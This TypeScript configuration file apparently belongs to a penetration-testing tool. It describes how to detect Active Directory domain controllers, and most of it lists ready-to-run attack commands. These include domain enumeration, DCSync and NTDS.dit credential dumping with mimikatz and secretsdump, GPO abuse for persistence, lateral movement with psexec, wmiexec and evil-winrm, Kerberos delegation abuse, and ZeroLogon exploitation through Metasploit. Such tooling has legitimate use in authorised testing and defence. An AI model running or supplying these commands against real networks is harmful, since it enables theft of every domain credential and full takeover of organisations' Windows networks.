/**
 * Active Directory Service Configuration
 * Active Directory Domain Controller
 * 
 * @version 1.0.0
 * @author Security Team
 */
import type { ServiceConfig } from '../types';

export const activeDirectoryConfig: ServiceConfig = {
  id: 'active-directory',
  name: 'Active Directory Domain Controller',
  description: 'Active Directory - служба каталогов Microsoft, центр управления Windows-сетью. Domain Controller - критически важный сервер для аутентификации, групповых политик и управления идентификацией. Главная цель атак в корпоративной среде.',
  categoryId: 'directory',
  version: '1.0.0',
  tags: ['directory', 'active-directory', 'windows', 'domain-controller', 'authentication'],

  matchers: {
    serviceNames: ['microsoft-ds', 'ldap', 'kerberos', 'dns', 'kpasswd', 'globalcatLDAP'],
    cpePatterns: ['cpe:/o:microsoft:windows_server', 'cpe:/a:microsoft:active_directory'],
    bannerRegex: [
      'Active Directory',
      'Domain Controller',
      'Windows Server',
    ],
    productPatterns: ['Microsoft Active Directory', 'Windows Server'],
    standardPorts: [88, 389, 445, 636, 3268, 3269], // Kerberos, LDAP, SMB, LDAPS, Global Catalog
    nseScriptMatchers: [
      { scriptName: 'ldap-rootdse', outputPattern: 'domainController' },
      { scriptName: 'smb-os-discovery', outputPattern: 'Windows Server' },
    ],
  },

  confidenceThreshold: 40,

  techniques: [
    {
      id: 'ad-enum',
      name: 'AD Enumeration',
      mitreId: 'T1087.002',
      description: 'Комплексное перечисление Active Directory.',
      commands: [
        { tool: 'crackmapexec', command: 'crackmapexec smb <target> --users --groups --local-groups', description: 'CME AD enumeration' },
        { tool: 'bloodhound', command: 'bloodhound-python -u user -p pass -d domain.local -ns <target>', description: 'BloodHound collection' },
        { tool: 'powerview', command: 'Get-NetDomainController', description: 'PowerView DC enum' },
      ],
      difficulty: 'medium',
      tags: ['enumeration', 'active-directory', 'reconnaissance'],
    },
    {
      id: 'ad-dcsync',
      name: 'DCSync Attack',
      mitreId: 'T1003.006',
      description: 'Имитация репликации DC для получения всех паролей домена.',
      commands: [
        { tool: 'mimikatz', command: 'lsadump::dcsync /domain:domain.local /user:Administrator', description: 'DCSync via Mimikatz' },
        { tool: 'impacket-secretsdump', command: 'secretsdump.py -just-dc domain/user:pass@target', description: 'Impacket DCSync' },
        { tool: 'crackmapexec', command: 'crackmapexec smb <target> -u admin -p pass --ntds', description: 'CME NTDS dump' },
      ],
      difficulty: 'hard',
      prerequisites: ['Domain Admin или Replication privileges'],
      tags: ['dcsync', 'credential-dump', 'domain-admin'],
    },
    {
      id: 'ad-ntds-dump',
      name: 'NTDS.dit Extraction',
      mitreId: 'T1003.003',
      description: 'Извлечение базы данных NTDS.dit с контроллера домена.',
      commands: [
        { tool: 'ntdsutil', command: 'ntdsutil "ac i ntds" "ifm" "create full c:\\temp" q q', description: 'IFM NTDS dump' },
        { tool: 'vssadmin', command: 'vssadmin create shadow /for=C:', description: 'VSS shadow copy' },
        { tool: 'crackmapexec', command: 'crackmapexec smb <target> -u admin -p pass --ntds vss', description: 'CME NTDS VSS dump' },
        { tool: 'secretsdump', command: 'secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL', description: 'Local NTDS dump' },
      ],
      difficulty: 'hard',
      prerequisites: ['Admin доступ к DC', 'Local admin или SYSTEM'],
      tags: ['ntds', 'credential-dump', 'persistence'],
    },
    {
      id: 'ad-gpo-abuse',
      name: 'GPO Abuse',
      mitreId: 'T1484.001',
      description: 'Использование Group Policy Objects для lateral movement и persistence.',
      commands: [
        { tool: 'powerview', command: 'Get-NetGPO | Get-ObjectAcl -ResolveGUIDs', description: 'Enumerate GPO ACLs' },
        { tool: 'sharprouge', command: 'SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Command "cmd.exe /c whoami" --GPOName "Default Domain Policy"', description: 'GPO abuse' },
        { tool: 'pygpoabuse', command: 'pygpoabuse.py domain/user -p pass -gpo-id "{GUID}" -task', description: 'Python GPO abuse' },
      ],
      difficulty: 'hard',
      prerequisites: ['Write access к GPO'],
      tags: ['gpo', 'lateral-movement', 'persistence'],
    },
    {
      id: 'ad-lateral-movement',
      name: 'Lateral Movement Techniques',
      mitreId: 'T1021',
      description: 'Техники перемещения внутри домена.',
      commands: [
        { tool: 'crackmapexec', command: 'crackmapexec smb targets.txt -u user -p pass -d domain.local', description: 'CME lateral movement' },
        { tool: 'psexec', command: 'psexec.py domain/user:pass@target', description: 'PsExec' },
        { tool: 'wmiexec', command: 'wmiexec.py domain/user:pass@target', description: 'WMIExec' },
        { tool: 'evil-winrm', command: 'evil-winrm -i target -u user -p pass', description: 'WinRM lateral' },
      ],
      difficulty: 'medium',
      prerequisites: ['Валидные учетные данные'],
      tags: ['lateral-movement', 'smb', 'wmi', 'winrm'],
    },
    {
      id: 'ad-delegation-abuse',
      name: 'Delegation Abuse',
      mitreId: 'T1558',
      description: 'Эксплуатация настроек делегирования Kerberos.',
      commands: [
        { tool: 'powerview', command: 'Get-DomainComputer -Unconstrained', description: 'Find unconstrained delegation' },
        { tool: 'rubeus', command: 'Rubeus.exe monitor /interval:1 /filteruser:Administrator', description: 'Monitor TGTs' },
        { tool: 'impacket', command: 'getST.py -spn HOST/target -impersonate Administrator domain.local/comp$', description: 'S4U abuse' },
      ],
      difficulty: 'hard',
      tags: ['delegation', 'kerberos', 'privilege-escalation'],
    },
    {
      id: 'ad-zerologon',
      name: 'ZeroLogon (CVE-2020-1472)',
      description: 'Эксплуатация критической уязвимости Netlogon.',
      cves: [
        { cveId: 'CVE-2020-1472', cvss: 10.0, description: 'ZeroLogon - DC impersonation', exploitAvailable: true },
      ],
      commands: [
        { tool: 'crackmapexec', command: 'crackmapexec smb <target> -u \'\' -p \'\' -M zerologon', description: 'ZeroLogon check' },
        { tool: 'impacket', command: 'zerologon_tester.py DC_NAME <target>', description: 'ZeroLogon test' },
        { tool: 'metasploit', command: 'use exploit/windows/dcerpc/cve_2020_1472_zerologon', description: 'MSF ZeroLogon' },
      ],
      difficulty: 'medium',
      tags: ['vulnerability', 'zerologon', 'critical'],
    },
  ],

  triggers: [],

  ui: {
    icon: 'building-2',
    color: '#3b82f6',
    displayPriority: 100,
  },

  references: [
    { title: 'Active Directory Methodology', url: 'https://book.hacktricks.xyz/windows/active-directory-methodology' },
    { title: 'BloodHound', url: 'https://github.com/BloodHoundAD/BloodHound' },
  ],

  notes: 'DC - сердце AD. DCSync + KRBTGT = полный контроль. BloodHound обязателен для анализа. Проверяйте ZeroLogon, PrintNightmare, PetitPotam на старых системах. GPO abuse = persistence.',
};

export default activeDirectoryConfig;
